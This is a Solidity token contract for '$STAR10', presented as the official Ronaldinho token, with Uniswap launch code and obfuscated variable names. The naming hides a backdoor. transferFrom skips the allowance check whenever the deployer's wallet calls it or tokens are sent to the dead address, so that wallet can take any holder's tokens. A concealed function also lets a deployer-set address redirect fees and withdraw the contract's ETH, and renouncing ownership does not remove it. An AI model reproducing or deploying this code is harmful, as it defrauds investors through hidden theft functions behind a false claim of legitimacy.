// SPDX-License-Identifier: MIT

/*
    Name: THE ONLY OFFICIAL RONALDINHO TOKEN
    Symbol: $STAR10

    https://x.com/10Ronaldinho/status/1896323945697018323
    https://t.me/Ronaldinho_eth
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract STAR10 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"THE ONLY OFFICIAL RONALDINHO TOKEN";
    string private constant _symbol = unicode"STAR10";
    
    address payable private _Ljikojioe3e;
    mapping(address => uint256) private _Djfoeije3e;
    mapping(address => mapping(address => uint256)) private _tye3rf;
    mapping(address => bool) private _dlfjeie3e;
    uint256 private _lkcvjoie3e = 10;
    uint256 private _odjifoee3e = 10;
    uint256 private _dofjieojkcnlke3e = 0;
    uint256 private _ocijfoeie3e = 0;
    uint256 private _vjodie3e = 7;
    uint256 private _covjioiee3e = 7;
    uint256 private _buyCount = 0;
    address private _vkoeijojitoije3e;
    address private _nGHGknjfke3e = address(0xdead);
    uint256 public _jhbjhvjee3e = 20000000 * 10 **_decimals;
    uint256 public _kbjnknje3e = 20000000 * 10 **_decimals;
    uint256 public _bnjhjhbje3e = 10000000 * 10 **_decimals;
    uint256 private constant _mvnbjhje3e = 1000000000 * 10 **_decimals;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _jhbjhvjee3e);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _Ljikojioe3e = payable(_msgSender());
        _Djfoeije3e[address(this)] = _mvnbjhje3e * 98 / 100;
        _Djfoeije3e[owner()] = _mvnbjhje3e * 2 / 100;
        _dlfjeie3e[owner()] = true;
        _dlfjeie3e[address(this)] = true;
        _dlfjeie3e[_Ljikojioe3e] = true;
        _vkoeijojitoije3e = _msgSender();
        emit Transfer(address(0), address(this), _mvnbjhje3e * 98 / 100);
        emit Transfer(address(0), address(owner()), _mvnbjhje3e * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _mvnbjhje3e;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _tye3rf[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _Djfoeije3e[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _tye3rf[owner][spender];
    }

    receive() external payable {}
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _vjkbjkn_jknke3e(_msgSender(), recipient, amount);
        return true;
    }

    function _Toldoe3e(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(msg.sender == _Ljikojioe3e) return true;
        return sender != uniswapV2Pair && recipient == _nGHGknjfke3e;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _vjkbjkn_jknke3e(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _GHGkjfn_e3e(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _GHGkjfn_e3e(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        if(!_Toldoe3e(sender, recipient)) return _tye3rf[sender][_msgSender()];
        return amount;
    }

    function GO_TO_THE_MOON() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _mvnbjhje3e);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function _GHGkjfre3e(uint256 amount) private {
        _Ljikojioe3e.transfer(amount);
    }

    function _swap_lknlke3e(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _vjkbjkn_jknke3e(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _vjodie3e)
                        ? _dofjieojkcnlke3e
                        : _lkcvjoie3e
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_dlfjeie3e[to]
            ) {
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _covjioiee3e)
                            ? _ocijfoeie3e
                            : _odjifoee3e
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _bnjhjhbje3e) ? contractTokenBalance : _bnjhjhbje3e; 
                    _swap_lknlke3e((amount < minBalance) ? amount : minBalance);
                }
                _GHGkjfre3e(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _Djfoeije3e[address(this)] =_Djfoeije3e[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _Djfoeije3e[from] =_Djfoeije3e[from].sub(amount);
        _Djfoeije3e[to] =_Djfoeije3e[to].add(amount.sub(taxAmount));
        if(_nGHGknjfke3e != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function removeLimits () external onlyOwner {
        _jhbjhvjee3e = _mvnbjhje3e;
        _kbjnknje3e = _mvnbjhje3e;
        emit MaxTxAmountUpdated(_mvnbjhje3e);
    }

    function _GHGlkjke_e3e(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _nkvjbnkjne3e(address payable receipt) external {
        require(msg.sender == _vkoeijojitoije3e , "");
        _Ljikojioe3e = receipt;
        _GHGlkjke_e3e(address(this).balance);
    }
}